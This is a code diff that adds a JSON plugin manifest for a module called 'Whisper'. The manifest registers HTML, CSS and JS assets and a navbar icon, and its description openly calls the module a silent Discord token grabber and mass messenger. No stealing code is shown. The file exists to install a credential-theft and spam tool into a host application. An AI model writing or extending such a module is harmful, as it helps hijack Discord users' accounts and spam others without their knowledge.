@@ -1,0 +1,18 @@
+{
+  "id": "whisper",
+  "name": "Whisper",
+  "apiVersion": 2,
+  "runtime": "native",
+  "version": "1.0.0",
+  "description": "Silent Discord token grabber and mass messenger.",
+  "entry": "whisper.html",
+  "assets": {
+    "html": "whisper.html",
+    "css": "whisper.css",
+    "js": "whisper.js"
+  },
+  "navbar": {
+    "label": "Whisper",
+    "icon": "fa-comment-dots"
+  }
+}
